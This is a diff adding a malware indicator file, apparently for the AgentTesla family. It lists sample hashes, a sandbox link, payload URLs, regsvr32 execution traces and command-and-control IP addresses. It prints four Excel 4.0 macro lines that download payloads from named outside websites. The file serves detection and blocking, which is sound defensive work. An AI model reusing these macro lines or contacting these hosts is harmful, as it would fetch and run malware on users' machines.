@@ -1,0 +1,62 @@
+AgentTesla | 2022.06.21
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip B8DA77F1F21C2AAA2ED0711398AC6CEF1599C80BD65FA05CD148A4E192B10A57
+.xls c0b609b0a994f32dfd5188ab8ba02e71b8acd30c95c4573c6a5aeebd4e6e01e5
+.dll feca36fa47382c8ce959ae572f627b56ee60c59b3138ba0d5ff77de1f2348e8a
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://www.digitalkhulna.com/wp-admin/L2z2e/", "..\peg1.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://www.dnahealth.gr/wp-content/QkkKMaLwy4jURh6FD/", "..\peg2.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.campusconindigital.org/moodle_old/9giglHrg2t/", "..\peg3.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.eapro.in/wp-admin/sf2MppPW30cKaWeko/", "..\peg4.ocx")
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://tria.ge/220614-v6j5ksgbfr
+
+
+# --------------------------------------------------------- #
+# ------------------------ DOMAINS ------------------------ #
+# --------------------------------------------------------- #
+https://www.digitalkhulna.com/wp-admin/L2z2e/
+https://www.dnahealth.gr/wp-content/QkkKMaLwy4jURh6FD/
+http://www.campusconindigital.org/moodle_old/9giglHrg2t/
+http://www.eapro.in/wp-admin/sf2MppPW30cKaWeko/
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\EFT.xls
+
+C:\Windows\System32\regsvr32.exe /S ..\peg1.ocx
+
+C:\Windows\system32\regsvr32.exe "C:\Windows\system32\HMITvzIokEwdBFP\xUHgxPEk.dll
+
+C:\Windows\System32\regsvr32.exe /S ..\peg2.ocx
+
+C:\Windows\system32\regsvr32.exe "C:\Windows\system32\UmPGrlfqJidzRv\KunjljH.dll
+
+C:\Windows\System32\regsvr32.exe /S ..\peg3.ocx
+
+C:\Windows\system32\regsvr32.exe "C:\Windows\system32\NUEwnEFnTnCHlrG\mhNHGLhGe.dll
+
+C:\Windows\System32\regsvr32.exe /S ..\peg4.ocx
+
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
+82.165.152.127:8080
+51.161.73.194:443
+103.75.201.2:443
+5.9.116.246:8080
+213.241.20.155:443
+79.137.35.198:8080
+119.193.124.41:7080
+186.194.240.217:443
+172.105.226.75:8080
+150.95.66.124:8080
